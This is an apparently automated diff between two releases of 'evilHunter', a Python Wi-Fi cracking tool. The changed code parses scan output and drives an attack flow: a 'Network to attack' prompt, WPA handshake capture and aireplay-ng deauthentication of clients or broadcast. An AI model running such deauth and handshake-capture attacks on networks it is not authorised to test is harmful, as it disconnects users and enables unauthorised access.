# Comparing `tmp/evilHunter-0.1.9.45.tar.gz` & `tmp/evilHunter-0.1.9.46.tar.gz`

## filetype from file(1)

```diff
@@ -1 +1 @@
-gzip compressed data, was "evilHunter-0.1.9.45.tar", last modified: Thu Jun 22 20:35:10 2023, max compression
+gzip compressed data, was "evilHunter-0.1.9.46.tar", last modified: Fri Jun 23 11:51:55 2023, max compression
```

## Comparing `evilHunter-0.1.9.45.tar` & `evilHunter-0.1.9.46.tar`

### file list

```diff
@@ -1,13 +1,13 @@
-drwxr-xr-x   0 root         (0) root         (0)        0 2023-06-22 20:35:10.220749 evilHunter-0.1.9.45/
--rw-r--r--   0 root         (0) root         (0)     2653 2023-06-22 20:35:10.220749 evilHunter-0.1.9.45/PKG-INFO
--rw-r--r--   0 root         (0) root         (0)     2420 2023-06-22 19:13:13.000000 evilHunter-0.1.9.45/README.md
--rw-r--r--   0 root         (0) root         (0)     4212 2023-06-22 19:31:15.000000 evilHunter-0.1.9.45/evilCracker.py
-drwxr-xr-x   0 root         (0) root         (0)        0 2023-06-22 20:35:10.220749 evilHunter-0.1.9.45/evilHunter.egg-info/
--rw-r--r--   0 root         (0) root         (0)     2653 2023-06-22 20:35:10.000000 evilHunter-0.1.9.45/evilHunter.egg-info/PKG-INFO
--rw-r--r--   0 root         (0) root         (0)      216 2023-06-22 20:35:10.000000 evilHunter-0.1.9.45/evilHunter.egg-info/SOURCES.txt
--rw-r--r--   0 root         (0) root         (0)        1 2023-06-22 20:35:10.000000 evilHunter-0.1.9.45/evilHunter.egg-info/dependency_links.txt
--rw-r--r--   0 root         (0) root         (0)       14 2023-06-22 20:35:10.000000 evilHunter-0.1.9.45/evilHunter.egg-info/requires.txt
--rw-r--r--   0 root         (0) root         (0)        6 2023-06-22 20:35:10.000000 evilHunter-0.1.9.45/evilHunter.egg-info/top_level.txt
--rw-r--r--   0 root         (0) root         (0)    30757 2023-06-22 19:13:13.000000 evilHunter-0.1.9.45/evilHunter.py
--rw-r--r--   0 root         (0) root         (0)       38 2023-06-22 20:35:10.220749 evilHunter-0.1.9.45/setup.cfg
--rw-r--r--   0 root         (0) root         (0)      558 2023-06-22 19:13:13.000000 evilHunter-0.1.9.45/setup.py
+drwxr-xr-x   0 root         (0) root         (0)        0 2023-06-23 11:51:55.438934 evilHunter-0.1.9.46/
+-rw-r--r--   0 root         (0) root         (0)     2653 2023-06-23 11:51:55.438934 evilHunter-0.1.9.46/PKG-INFO
+-rw-r--r--   0 root         (0) root         (0)     2420 2023-06-22 19:13:13.000000 evilHunter-0.1.9.46/README.md
+-rw-r--r--   0 root         (0) root         (0)     4212 2023-06-22 19:31:15.000000 evilHunter-0.1.9.46/evilCracker.py
+drwxr-xr-x   0 root         (0) root         (0)        0 2023-06-23 11:51:55.438934 evilHunter-0.1.9.46/evilHunter.egg-info/
+-rw-r--r--   0 root         (0) root         (0)     2653 2023-06-23 11:51:55.000000 evilHunter-0.1.9.46/evilHunter.egg-info/PKG-INFO
+-rw-r--r--   0 root         (0) root         (0)      216 2023-06-23 11:51:55.000000 evilHunter-0.1.9.46/evilHunter.egg-info/SOURCES.txt
+-rw-r--r--   0 root         (0) root         (0)        1 2023-06-23 11:51:55.000000 evilHunter-0.1.9.46/evilHunter.egg-info/dependency_links.txt
+-rw-r--r--   0 root         (0) root         (0)       14 2023-06-23 11:51:55.000000 evilHunter-0.1.9.46/evilHunter.egg-info/requires.txt
+-rw-r--r--   0 root         (0) root         (0)        6 2023-06-23 11:51:55.000000 evilHunter-0.1.9.46/evilHunter.egg-info/top_level.txt
+-rw-r--r--   0 root         (0) root         (0)    31252 2023-06-23 11:42:45.000000 evilHunter-0.1.9.46/evilHunter.py
+-rw-r--r--   0 root         (0) root         (0)       38 2023-06-23 11:51:55.438934 evilHunter-0.1.9.46/setup.cfg
+-rw-r--r--   0 root         (0) root         (0)      558 2023-06-23 11:44:40.000000 evilHunter-0.1.9.46/setup.py
```

### Comparing `evilHunter-0.1.9.45/PKG-INFO` & `evilHunter-0.1.9.46/PKG-INFO`

 * *Files 4% similar despite different names*

```diff
@@ -1,10 +1,10 @@
 Metadata-Version: 2.1
 Name: evilHunter
-Version: 0.1.9.45
+Version: 0.1.9.46
 Summary: Cracking WiFi(KCRACK)
 Home-page: https://github.com/an0mal1a/evilHunter
 Author: an0mal1a
 Author-email: pablodiez024@proton.me
 Description-Content-Type: text/markdown
 
 # evilHunter
```

### Comparing `evilHunter-0.1.9.45/README.md` & `evilHunter-0.1.9.46/README.md`

 * *Files identical despite different names*

### Comparing `evilHunter-0.1.9.45/evilCracker.py` & `evilHunter-0.1.9.46/evilCracker.py`

 * *Files identical despite different names*

### Comparing `evilHunter-0.1.9.45/evilHunter.egg-info/PKG-INFO` & `evilHunter-0.1.9.46/evilHunter.egg-info/PKG-INFO`

 * *Files 4% similar despite different names*

```diff
@@ -1,10 +1,10 @@
 Metadata-Version: 2.1
 Name: evilHunter
-Version: 0.1.9.45
+Version: 0.1.9.46
 Summary: Cracking WiFi(KCRACK)
 Home-page: https://github.com/an0mal1a/evilHunter
 Author: an0mal1a
 Author-email: pablodiez024@proton.me
 Description-Content-Type: text/markdown
 
 # evilHunter
```

### Comparing `evilHunter-0.1.9.45/evilHunter.py` & `evilHunter-0.1.9.46/evilHunter.py`

 * *Files 1% similar despite different names*

```diff
@@ -426,39 +426,43 @@
         for itera in data:
             num += 1
             if itera not in obetives:
                 obetives.append(itera)
 
         info = "  ".join(obetives)
         n_d = 0
-
         if re.findall("-[0-9]+", info):
-            encription = re.findall("WPA[0-9]+[ ]+[A-Z]+[ ]+[A-Z]+", info)
+            try:
+                encription = re.findall("WPA[0-9]+", info)[0]
+            except IndexError:
+                continue
+
+            enc2 = info.split()[info.split().index(encription) + 1]
+            enc3 = info.split()[info.split().index(encription) + 2]
+            encryption = encription + " " + enc2 + " " + enc3
+
             if not encription:
-                encription = re.findall("WPA+[ ]+[A-Z]+[ ]+[A-Z]+", info)
-                if not encription:
+                encryption = re.findall("WPA", info)
+                if not encryption:
                     continue
 
-            try:
-                channel = info.split()[info.split().index("WPA2") - 2]
-            except ValueError:
-                channel = info.split()[info.split().index("WPA3") - 2]
-            except ValueError:
-                channel = info.split()[info.split().index("WPA") - 2]
-            except ValueError:
-                continue
+            # Definimos información de la red
+            power = re.search("-[0-9]+", info)
+            power = power.group()
+            channel = info.split()[info.split().index(encription) - 2]
+            name = info.split()[info.split().index(encription) + 3]
 
-            name = info.split()[info.split().index("WPA2") + 3]
             if re.findall("^(<length:*)", name):
                 name = f"N/D_{n_d}"
                 n_d += 1
 
             net_specs[name] = {"bssid": mac,
-                               "encription_type": encription[0],
-                               "channel": channel}
+                               "encription_type": encryption,
+                               "channel": channel,
+                               "power": power}
 
         else:
             continue
     print_process_data(net_specs, net_clients, args, all_got)
 
 
 def print_process_data(net_specs, net_clients, args, all_got):
@@ -482,21 +486,23 @@
         clients = None
         net += 1
 
         # RED INFO:
         bssid = net_specs[network]['bssid']
         channel = net_specs[network]['channel']
         cipher_type = net_specs[network]["encription_type"]
+        power = net_specs[network]["power"]
 
         time.sleep(0.5)
 
         print(Fore.YELLOW + f"\n\t{net}.[*] " + Fore.RED + "Name -> " + Fore.GREEN + "{}\n".format(network) + "\n\t\t" +
               Fore.YELLOW + "[+] " + Fore.BLUE + "BSSID -> " + Fore.GREEN + "{}".format(bssid) + "\t\t"
               + Fore.YELLOW + "[+] " + Fore.BLUE + "Channel -> " + Fore.GREEN + "{}".format(channel) +
-              "\t\t" + Fore.YELLOW + "[+] " + Fore.BLUE + "Encryption -> " + Fore.GREEN + "{}".format(cipher_type))
+              "\t\t" + Fore.YELLOW + "[+] " + Fore.BLUE + "Encryption -> " + Fore.GREEN + "{}".format(cipher_type) +
+              "\t\t" + Fore.YELLOW + "[*] " + Fore.BLUE + "Power -> " + Fore.GREEN + "{}\n".format(power))
 
         # CLIENTES INFO:
         for net_num in net_clients['networks']:
             try:
                 if net_clients['networks'][net_num][bssid]:
                     clients = net_clients['networks'][net_num][bssid]['clients']
                     break
@@ -514,15 +520,15 @@
                 print(Fore.RED + "\t\t\t\t\t  [!] " + Fore.BLUE + f"{client_num} ---> " + Fore.WHITE + f"{client}")
 
         else:
             text = Fore.WHITE + "\n\n\t\t\t\t     [♦]    NO DETECTED CLIENTS..."
             print(text)
             print("\t\t\t\t" + "-" * len(text))
 
-        print("\n\n\t", Fore.LIGHTYELLOW_EX + "▄" * 115, "\n\n")
+        print("\n\n\t", Fore.LIGHTYELLOW_EX + "▄" * 135, "\n\n")
     select_network(net_specs, net_clients, args)
 
 
 def select_network(net_specs, net_clients, args):
     network_to_attack = None
     while not network_to_attack:
         network_to_attack = input(Fore.YELLOW + "\n[!>] " + Fore.WHITE + "Network to attack (E.j 'MOVISTAR_XXXX'): ")
@@ -530,14 +536,15 @@
         if network_to_attack not in net_specs:
             print(Fore.YELLOW + "\n\t[!] " + Fore.RED + "La red {} no ha sido detectada..".format(network_to_attack))
             network_to_attack = None
         else:
             print(Fore.YELLOW + "\n\t[*] " + Fore.LIGHTCYAN_EX + "Red encontrada!")
             time.sleep(0.5)
             print(Fore.LIGHTCYAN_EX + "\n[*] " + Fore.YELLOW + "Preparando entorno...")
+
     prepare_attack(net_specs, net_clients, network_to_attack, args)
 
 
 def prepare_attack(net_specs, net_clients, network_to_attack, args):
     file = None
 
     while not file:
@@ -552,16 +559,24 @@
     # Definimos bssid y channel
     bssid = net_specs[network_to_attack]['bssid']
     ch = net_specs[network_to_attack]['channel']
 
     # Leer handshake
     direc = "/home/EvilHunter_Data/captures/" + network_to_attack
 
-    if net_clients:
+    for num_net in net_clients['networks']:
+        try:
+            clients = net_clients['networks'][num_net][bssid]
+        except KeyError:
+            clients = None
+            continue
+
+    if clients:
         attack_client = print_clients(net_clients, bssid)
+
     else:
         attack_client = None
 
     time.sleep(1)
     print(Fore.YELLOW + "\n[*] " + Fore.LIGHTRED_EX + "INICIANDO:" + Fore.LIGHTCYAN_EX + " Captura de " +
           Fore.RED + 'WPA handshake ' + Fore.LIGHTCYAN_EX +
           Fore.YELLOW + "ESPERE... --->  " + Fore.LIGHTCYAN_EX + "[CTRL + C] to stop manually..." + Fore.RESET)
@@ -575,14 +590,15 @@
     capture.start()
 
     # Juntamos para detener
     capture.join()
 
 
 def print_clients(net_clients, bssid):
+
     print(Fore.YELLOW + "\n\n[*] " + Fore.LIGHTBLUE_EX + "Listing clients of the network\n" + Fore.RESET)
     print("\tPara atacar a más de 1 cliente, ¡Números seguidos por coma!:\n\n\t\t\t" + Fore.RED + " [E.j: 1,2]\n")
 
     # CLIENTES DE RED INFO:
     for net_num in net_clients['networks']:
         try:
             if net_clients['networks'][net_num][bssid]:
@@ -663,14 +679,15 @@
             thread = threading.Thread(target=deauth_client, args=(bssid, client))
             thread.start()
             threads.append(thread)
 
         # Esperar a que todos los hilos terminen
         for thread in threads:
             thread.join()
+            
     # Si no al broadcast
     else:
         subprocess.Popen(['aireplay-ng', '--deauth', "0", "-a", bssid, interface],
                          stdout=subprocess.DEVNULL)
 
     done = False
     while True:
```

### Comparing `evilHunter-0.1.9.45/setup.py` & `evilHunter-0.1.9.46/setup.py`

 * *Files 1% similar despite different names*

```diff
@@ -1,15 +1,15 @@
 from setuptools import setup
 
 with open("README.md", "r", encoding="utf-8") as fh:
     long_description = fh.read()
 
 setup(
     name="evilHunter",
-    version="0.1.9.45",
+    version="0.1.9.46",
     description="Cracking WiFi(KCRACK)",
     long_description=long_description,
     long_description_content_type="text/markdown",
     author="an0mal1a",
     url="https://github.com/an0mal1a/evilHunter",
     author_email="pablodiez024@proton.me",
     packages=["words"],
```

